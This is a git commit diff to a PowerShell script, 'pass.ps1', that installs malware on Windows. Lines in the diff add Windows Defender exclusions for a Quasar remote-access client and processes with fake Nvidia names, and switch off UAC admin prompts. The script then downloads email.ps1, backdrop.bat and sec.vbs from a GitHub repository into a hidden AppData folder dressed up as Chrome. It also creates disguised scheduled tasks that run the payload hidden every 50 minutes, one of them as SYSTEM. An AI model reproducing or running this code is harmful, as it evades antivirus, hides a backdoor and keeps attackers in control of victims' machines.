9d9ff418ab2b424dff6fdbdef4aa555444e6a9b1
İsmayil <60405884+4V4loon@users.noreply.github.com>
2021-12-13 11:16:33 +0400

    Update pass.ps1

--- pass.ps1
+++ pass.ps1
@@ -13,24 +13,25 @@ Add-MpPreference -ExclusionProcess "Quasar-Client.exe" -Force
 Add-MpPreference -ExclusionProcess "NvidiaCoreComponent.exe" -Force
 Add-MpPreference -ExclusionProcess "NvidiaCore.exe" -Force
 Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
+New-Item -ItemType "directory" -Path "$env:appdata\Chrome"
+$home = $env:appdata\Chrome
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/email.ps1' -OutFile $home\email.ps1
 
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/email.ps1' -OutFile $env:appdata\Microsoft\email.ps1
-
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/backdrop.bat' -OutFile $env:appdata\Microsoft\backdrop.bat
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/backdrop.bat' -OutFile $home\backdrop.bat
 
 if(Test-Path -Path $env:appdata\Microsoft\Windows\'Start Menu'\Programs\Startup\prelim.vbs){
 Remove-Item -Path $env:appdata\Microsoft\Windows\'Start Menu'\Programs\Startup\prelim.vbs -Force
 }
 
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/sec.vbs' -OutFile $env:appdata\Microsoft\Windows\'Start Menu'\Programs\Startup\sec.vbs
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/sec.vbs' -OutFile $home\sec.vbs
 
 
 
-attrib +h "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\sec.vbs"
-attrib +h "$env:appdata\Microsoft\email.ps1"
-attrib +h "$env:appdata\Microsoft\backdrop.bat"
+attrib +h "$home\sec.vbs"
+attrib +h "$home\email.ps1"
+attrib +h "$home\backdrop.bat"
 
-schtasks /create /sc minute /mo 50 /tn "NvidiaUpdate" /tr "powershell.exe -executionpolicy bypass -NoProfile -WindowStyle Hidden -command 'cscript.exe $env:appdata\Microsoft\Windows\"""Start Menu"""\Programs\Startup\sec.vbs'" /f
+schtasks /create /sc minute /mo 50 /tn "ChromeBackgroundService" /tr "powershell.exe -executionpolicy bypass -NoProfile -WindowStyle Hidden -command 'cscript.exe $home\sec.vbs'" /f
 
 Set-ScheduledTask -TaskName "NvidiaUpdate" -User "NT AUTHORITY\SYSTEM"
 
